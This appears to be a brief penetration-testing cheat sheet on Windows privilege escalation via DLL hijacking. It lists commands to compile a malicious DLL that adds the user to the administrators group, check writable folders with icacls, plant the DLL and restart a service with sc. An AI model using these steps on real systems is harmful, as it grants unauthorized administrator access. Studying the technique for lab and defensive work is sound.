
1. **Detect DLL Hijacking:**
   - Use `Procmon` to identify missing DLLs.

2. **Compile Malicious DLL:**
   ```plaintext
   x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
   ```
   - Creates a DLL that adds the user to the local administrators group.

3. **Check Directory Permissions Using icacls:**
   ```plaintext
   icacls "C:\Temp"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the directory to be vulnerable.

4. **Exploit:**
   - Place `hijackme.dll` in `C:\Temp`.
   - Start the service:
     ```plaintext
     sc stop dllsvc & sc start dllsvc
     ```

5. **Verify:**
   ```plaintext
   net localgroup administrators
   ```
   - Confirms the user was added to the local administrators group.
